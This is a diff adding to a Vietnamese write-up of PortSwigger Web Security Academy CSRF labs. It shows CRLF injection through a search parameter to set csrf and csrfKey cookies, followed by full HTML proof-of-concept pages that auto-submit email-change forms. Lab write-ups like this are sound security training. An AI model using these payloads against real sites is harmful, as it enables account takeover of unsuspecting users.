@@ -137,5 +137,47 @@ Vẫn còn 1 endpoint nữa chưa khai thác là `/search.`.
 Mình nhận ra trong phản hồi có trường Set-Cookie ánh xạ giá trị trong biến HTTP GET `search`. 
 ![alt text](images/csrf/image-21.png) 
 
+Mình lợi dụng điều này, thêm set-cookie csrf.  
+`test%0D%0ASet-Cookie:+csrf%3dtest%3b+SameSite%3dNone`  
+![alt text](images/csrf/image-23.png)  
 
+Mình đã có thể hoàn toàn thao túng được token csrf. Trước khi gửi payload, mình cần gửi yêu cầu tới `/search` trước nhằm set cookie theo ý muốn, gửi bằng `<img>`.  
+
+```html
+<form method="POST" action="https://0a0700aa030153d680d31c8900480062.web-security-academy.net/my-account/change-email" name="csrf">
+    <input type="hidden" name="email" value="testpayload@gmail.com">
+    <input type="hidden" name="csrf" value="test">
+</form>
+<img src="https://0a0700aa030153d680d31c8900480062.web-security-academy.net/?search=test%0D%0ASet-Cookie:+csrf%3dtest%3b+SameSite%3dNone" onerror=document.csrf.submit()>
+```
+
+# CSRF where token is tied to non-session cookie
+Lỗi nằm trong chức năng đổi email, và token nằm trong non-session cookie.  
+
+Gói tin sẽ có 1 csrf token.  
+![alt text](images/csrf/image-24.png)  
+
+Tuy nhiên khi gửi yêu cầu đổi mail, thì csrf token ở cookie lại khác csrf token ở form.  
+![alt text](images/csrf/image-25.png)  
+
+Thử swap vị trí, copy token csrf ở form với ở trên với ở dưới nhưng bị lỗi `Invalid`, có thể mỗi token sẽ đảm nhận 1 task khác nhau.  
+
+Phát hiện trường search trong `/search` ánh xạ kết quả tìm kiếm vào trong `Set-Cookie:` header.  
+![alt text](images/csrf/image-26.png)  
+
+Thực hiện khai thác tương tự như lab trên, chèn thêm header `Set-Cookie:`.  
+![alt text](images/csrf/image-27.png)  
+
+Phát hiện nếu mình xóa session cookie, thì lại không báo lỗi.  
+
+Thử đăng nhập với tài khoản thứ hai, mình phát hiện rằng ở `/change-email`, giá trị `csrfKey` và `csrf` đều giống với của tài khoản thứ nhất, chỉ thay đổi mỗi session cookie. Có lẽ, việc trùng khớp cũng ở các tài khoản khác.  
+
+Vậy nếu mình set-cookie thành csrfKey trùng, và csrf trùng ở form thì sao.    
+```html
+<form method="POST" action="https://0aaf005f0410467f80503a870095000a.web-security-academy.net/my-account/change-email" name="csrf">
+    <input type="hidden" name="email" value="testpayload@gmail.com">
+    <input type="hidden" name="csrf" value="rtYQuYlVTjp1KmT8RMc97lJpnF9XwPhP">
+</form>
+<img src="https://0aaf005f0410467f80503a870095000a.web-security-academy.net/?search=test%0D%0ASet-Cookie:+csrfKey%3dW09mL07kE2IE8ef9j5v0jdIn7dE87DPd%3b+SameSite%3dNone" onerror=document.csrf.submit()>
+```
 
